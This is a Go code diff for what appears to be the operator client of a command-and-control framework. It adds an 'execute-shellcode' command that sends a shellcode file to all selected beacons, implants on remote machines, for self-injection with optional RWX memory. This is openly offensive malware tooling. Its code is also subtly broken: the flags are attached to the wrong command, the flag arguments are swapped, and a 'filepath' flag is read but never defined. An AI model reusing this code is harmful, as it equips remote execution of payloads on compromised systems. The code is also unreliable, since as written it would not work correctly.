@@ -12,9 +12,11 @@ import (
 	"github.com/rsteube/carapace"
 	"github.com/spf13/cobra"
 	"github.com/spf13/pflag"
+	"io/ioutil"
 	"log"
 	"os"
 	"regexp"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -408,6 +410,48 @@ func interactBeaconCommands() *cobra.Command {
 			app.SwitchMenu("")
 		},
 	})
+	executeshellcodeCmd := &cobra.Command{
+		Use:   "execute-shellcode",
+		Short: "Executes the given shellcode in the sliver process. Will inject into self (PID 0).",
+		Args:  cobra.MinimumNArgs(1),
+		Run: func(cmd *cobra.Command, args []string) {
+			var beacons = ctx.Value("beacons").([]string)
+			shellcodePath := cmd.Flag("filepath").Value.String()
+			shellcodeBin, err := ioutil.ReadFile(shellcodePath)
+			if err != nil {
+				app.Printf("\n%s\n", err.Error())
+				return
+			}
+			var beaconWG sync.WaitGroup
+			beaconWG.Add(len(beacons))
+			app.Printf("\nSending shellcode to %d beacon(s).\n", len(beacons))
+			timeout, _ := strconv.Atoi(cmd.Flag("timeout").Value.String())
+			for _, beacon := range beacons {
+				go func(beacon string) {
+					_, err := client.rpc.Task(context.Background(), &sliverpb.TaskReq{
+						Data:     shellcodeBin,
+						RWXPages: cmd.Flag("rwx-pages").Changed,
+						Pid:      uint32(0),
+						Request: &commonpb.Request{
+							Async:    true,
+							Timeout:  int64(timeout),
+							BeaconID: beacon,
+						},
+					})
+					if err != nil {
+						app.Printf("\n%s\n", err)
+						beaconWG.Done()
+						return
+					}
+					beaconWG.Done()
+				}(beacon)
+			}
+			beaconWG.Wait()
+		},
+	}
+	executeCmd.Flags().BoolP("r", "rwx-pages", false, "Use RWX permissions for memory pages")
+	executeCmd.Flags().IntP("t", "timeout", 60, "command timeout in seconds")
+	rootCmd.AddCommand(executeshellcodeCmd)
 	for _, cmd := range rootCmd.Commands() {
 		c := carapace.Gen(cmd)
 
